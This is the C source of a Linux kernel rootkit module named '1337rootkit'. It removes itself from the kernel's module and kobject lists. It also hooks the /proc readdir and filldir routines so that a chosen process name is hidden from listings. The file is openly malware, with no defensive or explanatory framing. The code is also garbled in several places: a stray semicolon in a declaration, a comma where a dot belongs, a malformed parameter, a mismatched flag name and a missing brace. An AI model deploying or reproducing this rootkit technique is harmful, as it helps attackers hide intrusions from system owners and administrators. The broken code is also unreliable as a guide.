//allows us to perform certain kernel-level operations, such as printk
#include <linux/ctype.h>
#include <linux/dcache.h>
#include <linux/file.h>
#include <linux/kernel.h>
//allows us to create the module
#include <linux/module.h>
//allows us to change memory protection settings for the system call table
#include <linux/highmem.h>
//contains the system call numbers
#include <asm/unistd.h>
#include <linux/version.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/syscalls.h>

static int rootkit_hidden = 0; /*boolean flag desginating the hidden status for the rootkit */
static char *procToHide; = "test";
static struct list_head *module_previous;
static struct list_head *module_kobj_previous;

static filldir_t real_filldir;
static int (*real_proc_readdir)(struct file*, void*, filldir_t);

/*
Remove our rootkit from list of modules and kernel objects.
*/
static void rootkit_hide(void) {

	if (module_hidden) return;
	printk(KERN_INFO "hiding 1337rootkit\n");

	/*store the previous module of the list if we need to reference it*/
	module_previous = THIS_MODULE->list.prev;
	
	list_del (&THIS_MODULE->list);

	/*store the previous kernel object of the list if we need to reference it*/
	module_kobj_previous = THIS_MODULE->mkobj.kobj,entry.prev;
	
	kobject_del (&THIS_MODULE->mkobj.kobj);
	list_del (&THIS_MODULE->mkobj.kobj.entry);
	printk(KERN_INFO "1337rootkit hidden\n");

}

static int hijacked_filldir(void *buf, char *proc_name, int len, loff_off, u32 ino, unsigned int d_type) {
	/* hiding the process */

	if(procToHide) {
		if (!strcmp(proc_name, procToHide)){
			printk("Hiding %s\n", procToHide);
			/* if found process name matches our designated process name, do nothing and return */
			return 0;	
	}
	/*otherwise perform the filldir syscall as normal */
	return real_filldir(buf, proc_name, len, off, ino, d_type);
}

static int hijacked_readdir(struct file *filep, void *dirent, filldir_t filldir) {
	/*hijacked readdir that reads our hijacked filldir buffer */

	real_filldir = filldir; /*store the real filldir */
	
	return real_proc_readdir(filep, dirent, hijacked_filldir);
}